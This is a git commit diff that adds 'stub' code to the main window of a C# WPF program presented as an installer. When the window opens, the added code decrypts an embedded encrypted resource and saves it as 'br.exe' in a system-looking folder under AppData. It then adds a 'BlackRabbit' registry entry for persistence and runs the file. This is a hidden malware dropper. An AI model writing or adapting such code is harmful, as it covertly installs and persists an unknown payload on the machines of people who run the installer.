a84e429db5c16119f5378d7121b2f29716f0e01e
Unknown <domagalski.dominik@gmail.com>
2017-09-09 00:13:14 +0200

    v1.0-beta
    stub added

--- INSTALLER/INSTALLER/MainWindow.xaml.cs
+++ INSTALLER/INSTALLER/MainWindow.xaml.cs
@@ -12,19 +12,45 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using System.Resources;
+using System.IO;
+using System.Threading;
+using System.Diagnostics;
 
 
 namespace INSTALLER
 {
+   
+
     /// <summary>
     /// Logika interakcji dla klasy MainWindow.xaml
     /// </summary>
     public partial class MainWindow : Window
     {
+        public static string path_static = "Microsoft\\Windows\\System\\";
+        public static string fileName = "br.exe";
+       
+
         public MainWindow()
         {
             InitializeComponent();
-            Brstub br = new Brstub();
+
+            string pathToDir = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path_static);
+            string fullPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path_static,fileName);
+            
+            if ( !File.Exists(fullPath))
+            {
+                if( !Directory.Exists(pathToDir)  )
+                {
+                    Directory.CreateDirectory(pathToDir);
+                }
+                BrstubRun br = new BrstubRun();
+                Thread stub = new Thread( new ParameterizedThreadStart( br.Run ) );
+                stub.Start(fullPath);
+                stub.Join();
+                
+            }
+            
             
 
 
@@ -53,5 +79,30 @@ namespace INSTALLER
         {
             this.Hide();
         }
+
+    }
+
+    class BrstubRun : Brstub
+    {
+        public void Run(object oPath)
+        {
+            byte[] encrypted = Resource1.IPconv_enc;
+            byte[] key = Resource1.IPconv_key;
+            string path = oPath.ToString();
+            
+            byte[] decrypted = this.Decrypt(encrypted, key);
+
+            if ( CheckMD5(decrypted, Resource1.IPconv_MD5) )
+            {
+                //MainWindow mw = new MainWindow();
+
+                this.SaveFile(path, decrypted);
+                this.AddToReg("BlackRabbit", path, RegKeyType.CurrentUser);
+                Process.Start(path);
+            }
+
+        }
     }
 }
+
+
